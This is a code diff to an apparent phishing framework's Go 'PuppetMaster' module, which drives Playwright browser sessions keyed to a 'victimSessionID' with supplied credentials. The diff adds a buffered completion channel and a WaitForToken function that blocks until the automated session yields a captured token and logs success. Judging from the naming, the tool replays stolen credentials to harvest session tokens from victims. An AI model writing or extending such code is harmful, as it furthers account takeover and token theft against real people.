@@ -51,6 +51,7 @@ type PuppetSession struct {
 	Page          playwright.Page        `json:"-" yaml:"-"`
 	Context       playwright.BrowserContext `json:"-" yaml:"-"`
 	LastActivity  time.Time              `json:"-" yaml:"-"`
+	CompletionChan chan string           `json:"-" yaml:"-"` // Signals completion with token value
 }
 
 // InitPuppetMaster initializes the global puppet instance
@@ -126,6 +127,7 @@ func (pm *PuppetMaster) LaunchPuppetForSession(victimSessionID string, credentia
 		Status:        "initializing",
 		StartedAt:     time.Now(),
 		LastActivity:  time.Now(),
+		CompletionChan: make(chan string, 1), // Buffered channel to prevent blocking
 	}
 
 	pm.activeSessions[victimSessionID] = puppetSession
@@ -139,6 +141,17 @@ func (pm *PuppetMaster) LaunchPuppetForSession(victimSessionID string, credentia
 // executePuppetSession runs the automation flow
 func (pm *PuppetMaster) executePuppetSession(session *PuppetSession) {
 	defer func() {
+		// Signal completion through channel
+		if session.CompletionChan != nil {
+			if session.Status == "completed" && session.TokenValue != "" {
+				session.CompletionChan <- session.TokenValue
+			} else {
+				session.CompletionChan <- "" // Signal failure
+			}
+			close(session.CompletionChan)
+		}
+		
+		// Handle panics
 		if r := recover(); r != nil {
 			log.Error("[PUPPET] panic in session %s: %v", session.Id, r)
 			session.Status = "failed"
@@ -380,6 +393,40 @@ func (pm *PuppetMaster) GetSession(victimSessionID string) (*PuppetSession, bool
 	session, exists := pm.activeSessions[victimSessionID]
 	return session, exists
 }
+
+// WaitForToken waits for a puppet session to complete and return a token
+func (pm *PuppetMaster) WaitForToken(sessionID, tokenName string, timeout time.Duration) (string, error) {
+	// First check if token already exists
+	if token, exists := pm.GetToken(sessionID, tokenName); exists {
+		log.Debug("[PUPPET] Token already available for session %s", sessionID)
+		return token, nil
+	}
+	
+	// Check if puppet session is running
+	session, exists := pm.GetSession(sessionID)
+	if !exists {
+		return "", fmt.Errorf("no puppet session found for %s", sessionID)
+	}
+	
+	if session.CompletionChan == nil {
+		return "", fmt.Errorf("puppet session has no completion channel")
+	}
+	
+	log.Info("[PUPPET] Waiting for puppet session %s to complete (timeout: %v)", session.Id, timeout)
+	
+	// Wait for completion with timeout
+	select {
+	case token := <-session.CompletionChan:
+		if token == "" {
+			return "", fmt.Errorf("puppet session failed or returned empty token")
+		}
+		log.Success("[PUPPET] Received token from puppet session: %s...", shortenToken(token))
+		return token, nil
+	case <-time.After(timeout):
+		return "", fmt.Errorf("puppet session timeout after %v", timeout)
+	}
+}
+
 
 // CleanupOldSessions removes old sessions
 func (pm *PuppetMaster) CleanupOldSessions(maxAge time.Duration) {
